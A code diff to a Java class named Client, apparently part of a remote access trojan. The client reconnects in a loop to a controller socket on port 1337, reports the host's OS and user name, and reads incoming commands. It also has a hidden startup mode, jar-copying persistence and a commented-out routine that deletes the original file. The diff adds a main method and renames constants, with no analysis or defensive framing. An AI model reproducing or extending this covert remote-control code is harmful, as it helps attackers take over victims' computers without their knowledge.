@@ -13,8 +13,8 @@ import java.nio.file.Paths;
 import java.util.Arrays;
 
 public class Client {
-    public static final int PORT = 5554;
-    public static final long RETRY = 5000;
+    public static final int PORT = 1337;
+    public static final long DELAY = 5000;
     public static final String IP = "127.0.0.1";
     public static final StartupMode startup = StartupMode.HIDDEN;
     private enum StartupMode {
@@ -38,7 +38,7 @@ public class Client {
                     pw = new PrintWriter(s.getOutputStream(), true);
                     this.sendInfo(pw, s);
                 } catch (Exception e) {}
-                Thread.sleep(RETRY);
+                Thread.sleep(DELAY);
             }
             BufferedReader br = new BufferedReader(new InputStreamReader(s.getInputStream()));
             boolean dead = false;
@@ -72,15 +72,13 @@ public class Client {
     private void sendInfo(PrintWriter pw, Socket s) {
         try {
             Packet packet = new Packet();
-            packet.action = MessageType.INFO.getID();
+            packet.action = MessageType.HARDWARE_INFO.getID();
             packet.data = Arrays.asList(new String[] {System.getProperty("os.name"), System.getProperty("user.name")});
             NetUtils.sendMessage(packet, pw);
         } catch (Exception e) {
             e.printStackTrace();
         }
     }
-
-
 
     private static void startup() throws URISyntaxException, IOException {
         File jar = new File(Client.class.getProtectionDomain().getCodeSource().getLocation()
@@ -129,5 +127,29 @@ public class Client {
                 }
             }
         }
+    }
+
+    public static void main(String[] args) {
+        /*
+        if (args.length > 0) {
+            try {
+                Thread.sleep(8000);
+            } catch (InterruptedException e1) {
+                e1.printStackTrace();
+            }
+            try {
+                new File(args[0]).delete();
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        }
+        try {
+            startup();
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+        */
+        manager = new ClientManager();
+        new Client();
     }
 }
